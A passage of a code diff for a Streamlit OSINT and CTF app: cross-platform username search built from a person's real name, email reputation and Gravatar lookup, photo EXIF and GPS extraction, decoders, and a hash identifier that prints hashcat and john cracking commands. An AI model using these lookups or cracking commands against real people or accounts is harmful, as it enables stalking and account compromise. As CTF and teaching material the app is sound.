+1. Type the username (like `charlidamelio`) OR a real name (like `Charlie D'Amelio`)
+2. Pick whether it's a username or a full name
+3. Hit Search — it'll check all platforms and show you what it finds
+
+**What's a "username"?** It's the @handle someone uses online. Like @nasa on Instagram, or nasa on GitHub.
+
+**Tip:** If the person goes by different names on different sites, try both their real name and known usernames.
+""")
+    tip("Some platforms block automated checks. If you get no results, use the manual links at the bottom to open each site yourself.")
+
+    col_q, col_m = st.columns([3, 1])
+    with col_q:
+        u_query = st.text_input("Username or full name", placeholder="johndoe  or  John Doe", key="u_query")
+    with col_m:
+        u_mode = st.radio("Type", ["Username", "Full name"], key="u_mode")
+
+    PLATFORMS = {
+        "TikTok": "https://tiktok.com/@{}",
+        "Instagram": "https://instagram.com/{}",
+        "Twitter/X": "https://twitter.com/{}",
+        "Facebook": "https://facebook.com/{}",
+        "GitHub": "https://github.com/{}",
+        "Reddit": "https://reddit.com/user/{}",
+        "YouTube": "https://youtube.com/@{}",
+        "Twitch": "https://twitch.tv/{}",
+        "Snapchat": "https://snapchat.com/add/{}",
+        "Telegram": "https://t.me/{}",
+        "Pinterest": "https://pinterest.com/{}",
+        "LinkedIn": "https://linkedin.com/in/{}",
+        "Threads": "https://threads.net/@{}",
+        "Medium": "https://medium.com/@{}",
+        "SoundCloud": "https://soundcloud.com/{}",
+        "Flickr": "https://flickr.com/people/{}",
+        "Tumblr": "https://tumblr.com/{}",
+        "DeviantArt": "https://deviantart.com/{}",
+        "Spotify": "https://open.spotify.com/user/{}",
+        "Steam": "https://steamcommunity.com/id/{}",
+    }
+
+    if st.button("🔍 Search All Platforms", use_container_width=True, key="hunt_go") and u_query:
+        q = u_query.strip()
+        cands = set()
+        if u_mode == "Username":
+            cands.add(q.lower().lstrip('@'))
+        else:
+            parts = q.lower().split()
+            first = parts[0] if parts else q.lower()
+            last = parts[-1] if len(parts) > 1 else ""
+            cands.update([q.lower().replace(" ", ""), q.lower().replace(" ", "."), q.lower().replace(" ", "_")])
+            if last:
+                cands.update([f"{first}{last}", f"{first}.{last}", f"{first}_{last}",
+                               f"{first[0]}{last}", f"{last}{first}", f"{first}{last}1",
+                               f"its{first}", f"real{first}"])
+        cands = list(cands)[:15]
+
+        found_list = []
+        pb = st.progress(0.0)
+        stat = st.empty()
+        total = len(cands) * len(PLATFORMS)
+        done = 0
+
+        for uname in cands:
+            stat.markdown(f"<span class='ldot'></span>Checking **@{uname}**...", unsafe_allow_html=True)
+            for plat, tmpl in PLATFORMS.items():
+                url = tmpl.format(uname)
+                try:
+                    resp = requests.get(url, timeout=4,
+                                        headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
                     if resp.status_code == 200:
                         body = resp.text.lower()
-                        # TikTok specific and general not-found phrases
-                        not_found_phrases = [
-                            "not found", "doesn't exist", "page not found", "user not found",
-                            "couldn't find this account", "sorry, this page isn't available",
-                            "no user found", "this account doesn't exist"
-                        ]
-                        if not any(phrase in body for phrase in not_found_phrases):
-                            results.append({"platform": plat, "username": username, "url": url})
+                        if not any(x in body for x in [
+                            "not found","doesn't exist","page not found",
+                            "user not found","couldn't find this account","sorry, this page"
+                        ]):
+                            found_list.append({"platform": plat, "username": uname, "url": url})
                 except:
                     pass
                 done += 1
-                progress.progress(min(done/total, 0.99))
-        status.empty()
-        progress.empty()
-        
-        if results:
-            st.success(f"✅ Found {len(results)} matches")
-            for r in results:
-                st.markdown(f"""
-                <div class='result-card'>
-                    <b>{r['platform']}</b> → @{r['username']}<br>
-                    <a href='{r['url']}' target='_blank'>{r['url']}</a>
-                </div>
-                """, unsafe_allow_html=True)
-        else:
-            st.warning("No profiles found. Try different spelling or mode.")
+                pb.progress(min(done / total, 0.99))
 
-# ========== TAB 3: Email OSINT ==========
+        pb.empty(); stat.empty()
+
+        if found_list:
+            st.success(f"Found {len(found_list)} profile(s)")
+            for r in found_list:
+                rcard(f"<b>{r['platform']}</b> <span class='badge-found'>FOUND</span><br>"
+                      f"@{r['username']}<br><a href='{r['url']}' target='_blank'>{r['url']}</a>")
+        else:
+            warn("Nothing found automatically. Try the manual links below — some platforms block bots.")
+
+        with st.expander("🔗 Open links manually (click to expand)"):
+            tip("If the search above came up empty, open these yourself. Some platforms only show results when you visit directly.")
+            for uname in list(cands)[:4]:
+                st.markdown(f"**Checking: @{uname}**")
+                mc = st.columns(5)
+                quick = [("TikTok", f"https://tiktok.com/@{uname}"),
+                         ("Instagram", f"https://instagram.com/{uname}"),
+                         ("Twitter", f"https://twitter.com/{uname}"),
+                         ("GitHub", f"https://github.com/{uname}"),
+                         ("LinkedIn", f"https://linkedin.com/in/{uname}")]
+                for i, (pn, pu) in enumerate(quick):
+                    with mc[i]:
+                        st.link_button(pn, pu, use_container_width=True)
+
+
+# ── TAB 3: EMAIL ────────────────────────────────────────────────────────
 with tab3:
-    st.markdown("### 📧 Email OSINT")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Gravatar lookup, breach check (HIBP), and email reputation — live data.</p>", unsafe_allow_html=True)
-    email = st.text_input("Email address", placeholder="target@example.com")
-    if st.button("Analyze", use_container_width=True) and email:
-        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
-            st.error("Invalid email format")
+    sec("Email Lookup")
+    st.markdown("""
+**What does this do?** Enter an email address and we'll:
+- Check if there's a Gravatar (profile picture) linked to it
+- Look up its reputation — is it legit or is it tied to spam?
+- Give you a direct link to check if it appeared in any data breaches
+
+**What's a data breach?** When a website gets hacked and user passwords/emails get leaked online.
+HaveIBeenPwned keeps a database of those leaks so you can check if an email was exposed.
+""")
+    tip("This works best with personal or business emails. Disposable email services (like guerrillamail) usually have low reputation scores.")
+
+    email_in = st.text_input("Email address", placeholder="someone@example.com", key="email_in")
+    if st.button("Look Up", use_container_width=True, key="email_go") and email_in:
+        em = email_in.strip().lower()
+        if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", em):
+            danger("That doesn't look like a valid email. Try: name@domain.com")
         else:
-            local, domain = email.split("@")
-            md5 = hashlib.md5(email.strip().lower().encode()).hexdigest()
-            st.markdown(f"""
-            <div class='glass-card'>
-                <b>📧 Email:</b> {email}<br>
-                <b>👤 Local part:</b> {local} &nbsp;·&nbsp; <b>🌐 Domain:</b> {domain}<br>
-                <b>🔐 MD5:</b> <code>{md5}</code>
-            </div>
-            """, unsafe_allow_html=True)
+            local, domain = em.split("@", 1)
+            md5h = hashlib.md5(em.encode()).hexdigest()
+            glass(f"<b>Email:</b> {em}<br><b>Domain:</b> {domain}<br><b>MD5:</b> <code>{md5h}</code>")
 
-            # Gravatar
-            grav_url = f"https://www.gravatar.com/avatar/{md5}?d=404"
+            sec("Profile Picture (Gravatar)")
             try:
-                g = requests.get(grav_url, timeout=5)
-                if g.status_code == 200:
-                    gc1, gc2 = st.columns([1, 4])
-                    gc1.image(f"https://www.gravatar.com/avatar/{md5}?s=80", width=80)
-                    gc2.markdown("<div class='result-card'>✅ <b>Gravatar profile found</b><br><span style='color:rgba(160,200,240,0.6);font-size:0.8rem;'>This email has a Gravatar-linked account.</span></div>", unsafe_allow_html=True)
+                grav = requests.get(f"https://www.gravatar.com/avatar/{md5h}?d=404&s=120", timeout=7)
+                if grav.status_code == 200:
+                    st.image(f"https://www.gravatar.com/avatar/{md5h}?s=100", width=100)
+                    ok("There's a Gravatar profile linked to this email.")
                 else:
-                    st.markdown("<div class='result-card'>— No Gravatar profile</div>", unsafe_allow_html=True)
+                    st.info("No Gravatar found for this address.")
             except:
-                pass
+                st.info("Couldn't reach Gravatar right now.")
 
-            # HIBP
-            st.markdown("#### 🔓 Data Breach Check")
-            with st.spinner("Checking HaveIBeenPwned..."):
-                try:
-                    hibp_url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}"
-                    r = requests.get(hibp_url, headers={"hibp-api-key": ""}, timeout=10)
-                    if r.status_code == 200:
-                        breaches = r.json()
-                        st.error(f"⚠️ Found in {len(breaches)} breach{'es' if len(breaches)>1 else ''}")
-                        for b in breaches[:8]:
-                            st.markdown(f"<div class='result-card'><b>{b['Name']}</b> <span style='color:rgba(160,200,240,0.5);font-size:0.8rem;'>{b.get('BreachDate','unknown date')}</span><br><span style='color:rgba(160,200,240,0.6);font-size:0.78rem;'>{', '.join(b.get('DataClasses',[])[:4])}</span></div>", unsafe_allow_html=True)
-                    elif r.status_code == 404:
-                        st.success("✅ No breaches found in HIBP database")
-                    else:
-                        st.link_button("Check on HIBP →", f"https://haveibeenpwned.com/account/{urllib.parse.quote(email)}")
-                except:
-                    st.link_button("Check on HaveIBeenPwned →", f"https://haveibeenpwned.com/account/{urllib.parse.quote(email)}")
+            sec("Data Breach Check")
+            st.markdown("Click below to check HaveIBeenPwned — it's free and shows which breaches this email appeared in.")
+            st.link_button("Check HaveIBeenPwned →", f"https://haveibeenpwned.com/account/{urllib.parse.quote(em)}", use_container_width=True)
 
-            # EmailRep
-            st.markdown("#### 📊 Email Reputation")
+            sec("Reputation Score")
             try:
-                erep = requests.get(f"https://emailrep.io/{urllib.parse.quote(email)}", timeout=8)
+                erep = requests.get(f"https://emailrep.io/{urllib.parse.quote(em)}",
+                                    headers={"User-Agent": "osint-suite/1.0"}, timeout=8)
                 if erep.status_code == 200:
-                    data = erep.json()
-                    rep = data.get('reputation', 'unknown')
-                    susp = data.get('suspicious', False)
-                    rep_color = "#ff3b30" if susp else "#34c759" if rep == "high" else "#ffcc00"
-                    st.markdown(f"""<div class='glass-card'>
-                        <b>Reputation:</b> <span style='color:{rep_color};font-weight:700;'>{rep.upper()}</span>
-                        &nbsp;·&nbsp; <b>Suspicious:</b> {"⚠️ Yes" if susp else "✅ No"}<br>
-                        <b>Domain created:</b> {data.get('details',{}).get('domain_created','?')}
-                        &nbsp;·&nbsp; <b>Profiles:</b> {', '.join(data.get('details',{}).get('profiles',[]) or ['none found'])}
-                    </div>""", unsafe_allow_html=True)
+                    d = erep.json()
+                    rep = d.get("reputation", "unknown")
+                    sus = d.get("suspicious", False)
+                    label = {"high": "🟢 Trusted", "medium": "🟡 Moderate", "low": "🔴 Suspicious"}.get(rep, "⚪ Unknown")
+                    st.markdown(f"**Reputation:** {label}")
+                    if sus:
+                        warn("This address is flagged as suspicious by emailrep.io")
+                    else:
+                        ok("Not flagged as suspicious.")
                 else:
-                    st.markdown("<div class='result-card'>EmailRep rate limited — try again shortly.</div>", unsafe_allow_html=True)
+                    st.info("EmailRep rate limited — try again in a minute.")
             except:
                 pass
 
-# ========== TAB 4: Metadata & EXIF ==========
+
+# ── TAB 4: METADATA ─────────────────────────────────────────────────────
 with tab4:
-    st.markdown("### 📁 Metadata & EXIF")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Extract EXIF data, GPS coordinates, and camera info from any image.</p>", unsafe_allow_html=True)
-    meta_file = st.file_uploader("Upload image", type=["jpg","jpeg","png","tiff"], key="meta")
+    sec("File Metadata & EXIF")
+    st.markdown("""
+**What is EXIF data?** Every photo taken on a phone or camera stores hidden information inside the file — things like:
+- What camera or phone took the photo
+- The exact GPS coordinates of where it was taken
+- The date and time it was taken
+- Software used to edit it
+
+**Why does this matter?** Criminals have been caught because they forgot to strip GPS data before posting photos online.
+Most social media (Instagram, Twitter) automatically removes this data, but photos shared directly often still have it.
+""")
+    tip("Try uploading a photo taken on your phone — you might be surprised what's stored in it.")
+
+    meta_file = st.file_uploader("Upload an image", type=["jpg","jpeg","png","tiff","webp"], key="meta_f")
     if meta_file:
         try:
             img = Image.open(io.BytesIO(meta_file.getvalue()))
-            mc1, mc2 = st.columns([1, 2])
-            with mc1:
-                st.image(img, width=220)
-            with mc2:
-                st.markdown(f"""<div class='glass-card'>
-                    <b>📄 File:</b> {meta_file.name}<br>
-                    <b>🖼️ Format:</b> {img.format or 'unknown'} &nbsp;·&nbsp; <b>Mode:</b> {img.mode}<br>
-                    <b>📐 Dimensions:</b> {img.size[0]} × {img.size[1]} px<br>
-                    <b>📦 Size:</b> {len(meta_file.getvalue())//1024} KB
-                </div>""", unsafe_allow_html=True)
+            st.image(img, width=250)
+            pills([("Format", img.format or "?"), ("Size", f"{img.size[0]}×{img.size[1]}"), ("Mode", img.mode)])
             exif = img._getexif()
             if exif:
-                gps_tags = {ExifTags.TAGS.get(k,k): v for k,v in exif.items() if "GPS" in ExifTags.TAGS.get(k,'')}
-                if gps_tags:
-                    st.warning("⚠️ GPS coordinates present — location data embedded in this image.")
-                with st.expander("📋 Full EXIF data", expanded=True):
-                    st.json({ExifTags.TAGS.get(k, str(k)): str(v)[:200] for k, v in exif.items()})
+                human = {ExifTags.TAGS.get(k, str(k)): str(v)[:200] for k, v in exif.items()}
+                if any("GPS" in k for k in human):
+                    danger("GPS coordinates found in this photo! It contains location data.")
+                else:
+                    ok("No GPS data found.")
+                with st.expander("📷 All EXIF fields (click to expand)"):
+                    st.json(human)
             else:
-                st.markdown("<div class='result-card'>— No EXIF metadata found in this image.</div>", unsafe_allow_html=True)
+                st.info("No EXIF data found — this image has been cleaned or was never tagged.")
         except Exception as e:
-            st.error(f"Could not read image: {e}")
+            danger(f"Couldn't read this file: {e}")
 
-# ========== TAB 5: CTF Solver – Deep Interactive ==========
+
+# ── TAB 5: CTF SOLVER ──────────────────────────────────────────────────
 with tab5:
-    st.markdown("### 🎯 CTF Solver — Interactive Toolkit")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>All decoders run in-browser. No data leaves your machine.</p>", unsafe_allow_html=True)
+    sec("CTF Solver")
 
-    ctf_tab = st.selectbox("Select tool", [
+    with st.expander("🆕 Never done a CTF? Start here", expanded=False):
+        st.markdown("""
+**CTF = Capture The Flag.** It's a cybersecurity competition where you solve puzzles to find a hidden "flag" — usually a string like `CTF{s0me_secret_here}`.
+
+**The most common types of challenges:**
+
+| Type | What you'll see | What to do |
+|------|----------------|------------|
+| **Encoding** | `dGhpcyBpcyBhIHRlc3Q=` or `Uryyb Jbeyq` | Use the Multi-Decoder below |
+| **Hash cracking** | `5f4dcc3b5aa765d61d8327deb882cf99` | Use Hash Identifier below |
+| **Steganography** | An image file with hidden data | Use Stego tools below |
+| **Web** | A login form or URL with weird parameters | Use Web Payloads below |
+| **Forensics** | A `.pcap` network capture or disk image | Use the Forensics guide below |
+
+**Stuck on something?** Paste whatever you have into the Multi-Decoder first — it tries everything at once.
+        """)
+
+    tool = st.selectbox("Pick a tool:", [
         "🔤 Multi-Decoder",
-        "🔄 ROT Brute-Force (all 25)",
         "#️⃣ Hash Identifier & Cracker",
+        "🔄 Caesar / ROT Brute Force",
+        "🖼️ Steganography",
+        "💉 Web Payloads",
+        "🔬 Forensics & PCAP",
         "🔢 Number Base Converter",
-        "🔡 Caesar / Vigenère Cipher",
-        "🗜️ Encoding Chain",
-        "🖼️ Steganography Guide",
-        "💉 Web Exploitation Payloads",
-        "🔬 Forensics & Volatility",
-        "⚙️ Reverse Engineering",
+        "🔐 XOR Decoder",
     ], key="ctf_tool")
 
-    # ── Multi-Decoder ──────────────────────────────────────────
-    if ctf_tab == "🔤 Multi-Decoder":
-        st.markdown("Paste anything — the tool tries every common encoding automatically.")
-        raw = st.text_area("Input", height=100, placeholder="dGhpcyBpcyBhIHRlc3Q=  or  68656c6c6f  or  Uryyb")
-        if raw and raw.strip():
-            r = raw.strip()
-            results = {}
+    # ── MULTI DECODER ──────────────────────────────────────────────────
+    if tool == "🔤 Multi-Decoder":
+        st.markdown("""
+**Paste any encoded text here and click the button for whatever you want to try.**
 
-            # Base64
-            try: results["Base64"] = base64.b64decode(r + "==").decode("utf-8")
-            except: pass
-            # Base64 URL-safe
-            try: results["Base64 URL-safe"] = base64.urlsafe_b64decode(r + "==").decode("utf-8")
-            except: pass
-            # Hex
-            try:
-                clean = r.replace(" ","").replace(":","")
-                results["Hex"] = bytes.fromhex(clean).decode("utf-8")
-            except: pass
-            # ROT13
-            results["ROT13"] = r.translate(str.maketrans(
+Not sure what encoding it is? Hit **Try Everything** — it'll run through all of them and show whatever works.
+
+Common clues:
+- Ends with `=` or `==` → probably **Base64**
+- Only letters, looks like gibberish → might be **ROT13**
+- Only `0-9` and `a-f` characters → probably **Hex**
+- Only `0`s and `1`s → **Binary**
+        """)
+        cipher = st.text_area("Paste your encoded text:", height=100,
+                               placeholder="dGhpcyBpcyBhIHRlc3Q=   or   Uryyb Jbeyq   or   48656c6c6f", key="ctf_cipher")
+
+        c1, c2, c3, c4, c5, c6 = st.columns(6)
+
+        def b64_decode(s):
+            s = s.strip()
+            pad = s + "=" * ((4 - len(s) % 4) % 4)
+            return base64.b64decode(pad).decode("utf-8", errors="replace")
+
+        def hex_decode(s):
+            c = re.sub(r'[^0-9a-fA-F]', '', s)
+            if len(c) % 2 != 0:
+                c = c[:-1]
+            return bytes.fromhex(c).decode("utf-8", errors="replace")
+
+        def bin_decode(s):
+            bits = re.sub(r'[^01]', '', s)
+            if len(bits) % 8 != 0:
+                bits = bits[:-(len(bits) % 8)]
+            if not bits:
+                raise ValueError("empty")
+            return "".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
+
+        def rot13(s):
+            return s.translate(str.maketrans(
                 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
-            # URL decode
-            try: results["URL Decode"] = urllib.parse.unquote(r)
-            except: pass
-            # Binary
-            try:
-                bits = r.replace(" ","")
-                if re.fullmatch(r'[01]+', bits) and len(bits) % 8 == 0:
-                    results["Binary"] = "".join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits),8))
-            except: pass
-            # Morse
-            MORSE = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I',
-                     '.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q',
-                     '.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..' :'Z',
-                     '-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....' :'5','-....':'6',
-                     '--...':'7','---..':'8','----.':'9'}
-            try:
-                words = r.strip().split(" / ")
-                decoded = " ".join("".join(MORSE.get(c,"?") for c in w.split()) for w in words)
-                if "?" not in decoded:
-                    results["Morse Code"] = decoded
-            except: pass
-            # Atbash
-            results["Atbash"] = r.translate(str.maketrans(
-                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
-                'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba'))
 
-            for name, val in results.items():
-                if val and val.strip() and val != r:
-                    st.markdown(f"<div class='result-card'><code>{name}</code><br><span style='color:#e0f4ff;'>{val[:300]}</span></div>", unsafe_allow_html=True)
-
-    # ── ROT Brute-Force ────────────────────────────────────────
-    elif ctf_tab == "🔄 ROT Brute-Force (all 25)":
-        text = st.text_area("Ciphertext", height=80, placeholder="Gur dhvpx oebja sbk")
-        if text:
-            for n in range(1, 26):
-                rotated = text.translate(str.maketrans(
-                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
-                    ('ABCDEFGHIJKLMNOPQRSTUVWXYZ'[n:] + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[:n]) +
-                    ('abcdefghijklmnopqrstuvwxyz'[n:] + 'abcdefghijklmnopqrstuvwxyz'[:n])
-                ))
-                st.markdown(f"<div class='result-card'><code>ROT{n:02d}</code> {rotated[:200]}</div>", unsafe_allow_html=True)
-
-    # ── Hash Identifier ────────────────────────────────────────
-    elif ctf_tab == "#️⃣ Hash Identifier & Cracker":
-        h_in = st.text_input("Paste hash", placeholder="5f4dcc3b5aa765d61d8327deb882cf99")
-        if h_in:
-            h = h_in.strip()
-            L = len(h)
-            HASH_MAP = {
-                (32, r'[a-fA-F0-9]{32}'): ("MD5", 0, "md5"),
-                (32, r'[a-zA-Z0-9./]{13}'): ("DES Crypt", None, None),
-                (40, r'[a-fA-F0-9]{40}'): ("SHA-1", 100, "sha1"),
-                (56, r'[a-fA-F0-9]{56}'): ("SHA-224", 1300, None),
-                (64, r'[a-fA-F0-9]{64}'): ("SHA-256", 1400, "sha256"),
-                (96, r'[a-fA-F0-9]{96}'): ("SHA-384", 10800, None),
-                (128, r'[a-fA-F0-9]{128}'): ("SHA-512", 1700, "sha512"),
-                (32, r'\$1\$.+'): ("MD5 Crypt", 500, None),
-                (60, r'\$2[aby]\$.+'): ("bcrypt", 3200, None),
-            }
-            detected = None
-            for (length, pattern), (name, hc_mode, jf) in HASH_MAP.items():
-                if L == length and re.fullmatch(pattern, h):
-                    detected = (name, hc_mode, jf); break
-            if not detected and re.fullmatch(r'[a-fA-F0-9]+', h):
-                detected = (f"Unknown hex ({L} chars)", None, None)
-
-            if detected:
-                name, hc_mode, jf = detected
-                st.success(f"✅ Detected: **{name}**")
-                col1, col2 = st.columns(2)
-                with col1:
-                    st.link_button("🔍 CrackStation", f"https://crackstation.net/", use_container_width=True)
-                with col2:
-                    st.link_button("🔍 Hashes.com", f"https://hashes.com/en/decrypt/hash", use_container_width=True)
-                st.markdown("**Local cracking commands:**")
-                if hc_mode is not None:
-                    st.code(f"hashcat -m {hc_mode} -a 0 '{h}' /usr/share/wordlists/rockyou.txt")
-                if jf:
-                    st.code(f"echo '{h}' > hash.txt\njohn --format=raw-{jf} --wordlist=/usr/share/wordlists/rockyou.txt hash.txt")
-                st.markdown("**Online rainbow tables** → [hashes.com](https://hashes.com/en/decrypt/hash) · [md5decrypt.net](https://md5decrypt.net)")
-            else:
-                st.warning("Could not identify hash type.")
-
-    # ── Number Base Converter ──────────────────────────────────
-    elif ctf_tab == "🔢 Number Base Converter":
-        num_in = st.text_input("Number or text", placeholder="48656c6c6f or 01001000 or 72")
-        base_from = st.radio("Interpret as", ["Hex","Binary","Decimal","Octal","ASCII text"], horizontal=True)
-        if num_in and num_in.strip():
-            v = num_in.strip().replace(" ","")
-            try:
-                if base_from == "Hex":      n = int(v, 16)
-                elif base_from == "Binary": n = int(v, 2)
-                elif base_from == "Decimal":n = int(v, 10)
-                elif base_from == "Octal":  n = int(v, 8)
-                else:                       n = int.from_bytes(v.encode(), 'big')
-
-                cols = st.columns(4)
-                cols[0].metric("Decimal", str(n))
-                cols[1].metric("Hex", hex(n))
-                cols[2].metric("Binary", bin(n))
-                cols[3].metric("Octal", oct(n))
+        with c1:
+            if st.button("Try Everything", use_container_width=True) and cipher:
+                found_any = False
+                for label, fn in [("Base64", b64_decode), ("Hex", hex_decode),
+                                   ("Binary", bin_decode), ("ROT13", rot13)]:
+                    try:
+                        r = fn(cipher)
+                        if r and any(c.isprintable() for c in r):
+                            ok(f"**{label}** → {r}")
+                            found_any = True
+                    except: pass
                 try:
-                    blen = (n.bit_length() + 7) // 8
-                    st.markdown(f"<div class='result-card'><code>ASCII</code> {n.to_bytes(blen,'big').decode('utf-8','replace')}</div>", unsafe_allow_html=True)
+                    ok(f"**URL decode** → {urllib.parse.unquote(cipher.strip())}")
+                    found_any = True
                 except: pass
-            except Exception as e:
-                st.error(f"Conversion error: {e}")
+                if not found_any:
+                    warn("Nothing decoded cleanly. Try a specific decoder or check if the text is correct.")
 
-    # ── Caesar / Vigenère ─────────────────────────────────────
-    elif ctf_tab == "🔡 Caesar / Vigenère Cipher":
-        mode = st.radio("Cipher", ["Caesar","Vigenère"], horizontal=True)
-        ct = st.text_area("Ciphertext", height=80)
-        if mode == "Caesar":
-            shift = st.slider("Shift", 1, 25, 13)
-            if ct:
-                out = ct.translate(str.maketrans(
-                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
-                    ('ABCDEFGHIJKLMNOPQRSTUVWXYZ'[shift:] + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[:shift]) +
-                    ('abcdefghijklmnopqrstuvwxyz'[shift:] + 'abcdefghijklmnopqrstuvwxyz'[:shift])
-                ))
-                st.markdown(f"<div class='result-card'><b>Decoded (shift {shift}):</b><br>{out}</div>", unsafe_allow_html=True)
-        else:
-            key = st.text_input("Key", placeholder="SECRET")
-            if ct and key:
-                key = key.upper()
-                out, ki = [], 0
-                for ch in ct:
+        with c2:
+            if st.button("Base64", use_container_width=True) and cipher:
+                try: ok(b64_decode(cipher))
+                except: danger("Not valid Base64. Check the text and try again.")
+
+        with c3:
+            if st.button("ROT13", use_container_width=True) and cipher:
+                ok(rot13(cipher))
+
+        with c4:
+            if st.button("Hex", use_container_width=True) and cipher:
+                try: ok(hex_decode(cipher))
+                except: danger("Not valid hex. Should only contain 0-9 and a-f.")
+
+        with c5:
+            if st.button("Binary", use_container_width=True) and cipher:
+                try: ok(bin_decode(cipher))
+                except Exception as e: danger(f"Not valid binary: {e}")
+
+        with c6:
+            if st.button("URL Decode", use_container_width=True) and cipher:
+                ok(urllib.parse.unquote(cipher.strip()))
+
+        # Base64 encode too
+        st.markdown("---")
+        st.markdown("**Need to encode something?**")
+        enc_in = st.text_input("Text to Base64-encode:", key="b64_enc")
+        if enc_in:
+            ok(f"Base64: `{base64.b64encode(enc_in.encode()).decode()}`")
+
+    # ── CAESAR / ROT BRUTE FORCE ────────────────────────────────────────
+    elif tool == "🔄 Caesar / ROT Brute Force":
+        st.markdown("""
+**Caesar cipher** shifts each letter by a fixed number. ROT13 is just Caesar with a shift of 13.
+
+If you have encoded text and aren't sure what shift was used, paste it here and we'll show you all 25 possibilities at once.
+The correct one will be the only one that reads as English (or whatever language the flag is in).
+        """)
+        caesar_in = st.text_area("Paste encoded text:", height=80, key="caesar_in")
+        if caesar_in:
+            st.markdown("**All 25 shifts — find the one that makes sense:**")
+            for shift in range(1, 26):
+                result = ""
+                for ch in caesar_in:
                     if ch.isalpha():
-                        k = ord(key[ki % len(key)]) - 65
-                        base = 65 if ch.isupper() else 97
-                        out.append(chr((ord(ch) - base - k) % 26 + base))
-                        ki += 1
+                        base = ord('A') if ch.isupper() else ord('a')
+                        result += chr((ord(ch) - base + shift) % 26 + base)
                     else:
-                        out.append(ch)
-                st.markdown(f"<div class='result-card'><b>Vigenère decoded:</b><br>{''.join(out)}</div>", unsafe_allow_html=True)
+                        result += ch
+                st.text(f"ROT{shift:2d}: {result[:120]}")
 
-    # ── Encoding Chain ────────────────────────────────────────
-    elif ctf_tab == "🗜️ Encoding Chain":
-        st.markdown("Chain multiple encodings — decode in reverse order (deepest first).")
-        chain_in = st.text_area("Input", height=80)
-        ops = st.multiselect("Apply (in order, last = outermost layer):",
-            ["Base64 Decode","Base64 Encode","URL Decode","URL Encode","Hex Decode","Hex Encode","ROT13","Reverse"],
-            default=["Base64 Decode"])
-        if chain_in and ops:
-            val = chain_in.strip()
-            for op in ops:
-                try:
-                    if op == "Base64 Decode": val = base64.b64decode(val + "==").decode()
-                    elif op == "Base64 Encode": val = base64.b64encode(val.encode()).decode()
-                    elif op == "URL Decode": val = urllib.parse.unquote(val)
-                    elif op == "URL Encode": val = urllib.parse.quote(val)
-                    elif op == "Hex Decode": val = bytes.fromhex(val.replace(" ","")).decode()
-                    elif op == "Hex Encode": val = val.encode().hex()
-                    elif op == "ROT13": val = val.translate(str.maketrans(
-                        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
-                        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
-                    elif op == "Reverse": val = val[::-1]
-                    st.markdown(f"<div class='result-card'><code>After {op}:</code><br>{val[:400]}</div>", unsafe_allow_html=True)
-                except Exception as e:
-                    st.error(f"Failed at **{op}**: {e}"); break
+    # ── HASH IDENTIFIER ────────────────────────────────────────────────
+    elif tool == "#️⃣ Hash Identifier & Cracker":
+        st.markdown("""
+**A hash is a one-way fingerprint of data.** You can't reverse it, but you can look it up in a database of known hashes.
 
-    # ── Steganography Guide ───────────────────────────────────
-    elif ctf_tab == "🖼️ Steganography Guide":
-        steg_f = st.file_uploader("Upload image (optional — for command generation)", type=["jpg","png","bmp","gif","tiff"], key="steg2")
-        fname = steg_f.name if steg_f else "image.png"
+**How to identify your hash:**
+- 32 characters → MD5
+- 40 characters → SHA-1
+- 64 characters → SHA-256
+- 128 characters → SHA-512
+- Starts with `$2y$` or `$2b$` → bcrypt
+
+After identifying it, paste it into CrackStation (free) to see if the original password is known.
+        """)
+        hash_in = st.text_input("Paste the hash:", placeholder="5f4dcc3b5aa765d61d8327deb882cf99", key="h_in")
+        if st.button("Identify", use_container_width=True) and hash_in:
+            h = hash_in.strip()
+            L = len(h)
+            hex_pat = re.fullmatch(r'[a-fA-F0-9]+', h)
+            if L == 32 and hex_pat:
+                ok("**MD5** — 32 hex characters")
+                st.code("hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
+            elif L == 40 and hex_pat:
+                ok("**SHA-1** — 40 hex characters")
+                st.code("hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
+            elif L == 64 and hex_pat:
+                ok("**SHA-256** — 64 hex characters")
+                st.code("hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
+            elif L == 128 and hex_pat:
+                ok("**SHA-512** — 128 hex characters")
+                st.code("hashcat -m 1700 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
+            elif re.match(r'^\$2[aby]\$', h):
+                ok("**bcrypt** — very slow to crack")
+                st.code("hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
+            else:
+                warn(f"Unknown hash type (length: {L}). Check hash-identifier or try manually.")
